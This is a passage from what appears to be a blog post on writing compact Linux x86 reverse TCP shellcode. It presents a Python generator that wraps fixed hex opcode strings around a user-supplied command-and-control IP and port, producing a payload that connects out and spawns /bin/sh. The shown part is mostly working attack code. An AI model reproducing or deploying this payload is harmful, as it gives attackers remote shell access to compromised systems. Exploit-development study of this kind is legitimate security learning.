...
The shellcode extracted from it comes up around 70 bytes in size which I think is not bad considering that the shellcodes from [shell-storm](https://www.shell-storm.org/shellcode/) and [exploit-db](https://www.exploit-db.com/shellcodes/) were of varying sizes but mostly all greater than 70 bytes and the main purpose of a writing a shellcode for exploitation purposes is making it as small as possible.

## A fully configurable Reverse TCP shellcode generator
...
I have extracted the opcodes from the assembly source using a `converter.py` script I made as a helper script(All links to codes referred to in this post will be available down below) and embedded it in the generator program without the variable parts - C2 IP and C2 Port.

Here is the full source-code of the Reverse TCP shellcode generator:
...
def main():
	...
	print("\n")
	shellcode = ''
	prependcode = "31c031db31c99966b86701b302b101cd8089c366b86a0168"
	...
	#print(c2_port_hex)
	appendcode = "666a0289e1b210cd8031c9b103b03f49cd8075f99952682f2f7368682f62696e89e3b00bcd80"
